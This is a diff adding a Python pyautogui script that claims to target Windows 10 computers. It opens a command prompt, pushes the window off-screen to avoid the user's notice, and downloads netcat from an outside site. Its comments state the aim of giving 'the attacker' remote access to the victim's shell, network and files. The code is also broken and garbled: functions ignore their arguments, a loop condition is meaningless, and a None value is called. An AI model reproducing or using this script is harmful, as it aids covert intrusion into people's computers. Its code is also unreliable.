@@ -1,0 +1,60 @@
+# this program targets a computer or server running a Windows 10 Operating System 
+
+import pyautogui
+import time
+
+#FUNCTIONS!!!
+
+def key1(x):
+  pyautogui.hotkey()
+
+def key2(x,y):
+  pyautogui.hotkey()
+
+def write1(x):
+  pyautogui.typewrite()
+
+def write2():
+  pyautogui.typewrite()
+
+#Opening CMD (Windows Command prompt)
+
+key2("win", "r")
+write1("cmd")
+key1("enter")
+
+#HIDING THE CMD FROM THE USER SIGHT !!!
+
+#This step involves moving the cmd all the way to the right of the computer screen making it less visible to the user leading to less suspision or compromisation
+
+key2("alt", "space")
+key1("m")
+for CLICK in range (500):   
+  key1("right")
+key1("enter")
+
+
+
+#DOWNLOADING NCAT !!!
+
+key2("win", "r")
+write1("iexplore")
+key2("ctrl", "e")
+write1("https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip") #Downloading NetCat file for windows 
+key1("enter")
+key1("enter")
+
+SwitchTabs = key2("alt", "tab")  #Switching Tabs to CMD
+while "cmd" != "cmd":
+  SwitchTabs()
+if "cmd" == "cmd":
+  key1("enter")
+
+# ENTERING COMMANDS!!!
+
+#Entering commands for certian ports you(The attacker) are listening on
+#This can allow us to gain remote access to the targets cmd which can give us info about the targets network and filesystem
+
+write1("pip install ncat")
+write1("pip upgrade ncat")
+write1("")
